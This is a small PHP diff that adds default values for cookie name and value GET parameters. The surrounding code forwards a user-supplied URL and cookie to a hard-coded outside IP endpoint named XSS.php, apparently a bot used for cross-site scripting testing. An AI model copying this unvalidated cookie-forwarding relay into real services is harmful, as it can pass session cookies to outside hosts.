@@ -18,7 +18,9 @@
 		if(isset($_GET['url']))
 		{
 			$url = 'http://'.$domain.'/'.$_GET['url'];
-			$data = json_encode(array('url' => $url, 'domain' => $domain, 'cookiename' => $_GET['cookiename'], 'cookievalue' => $_GET['cookievalue']));
+			$cookiename = isset($_GET['cookiename'])?$_GET['cookiename']:'null';
+			$cookievalue = isset($_GET['cookievalue'])?$_GET['cookievalue']:'null';
+			$data = json_encode(array('url' => $url, 'domain' => $domain, 'cookiename' => $cookiename, 'cookievalue' => $cookievalue));
 
 			$curl = curl_init();
 			curl_setopt($curl, CURLOPT_URL, "20.200.213.238:3737/XSS.php");
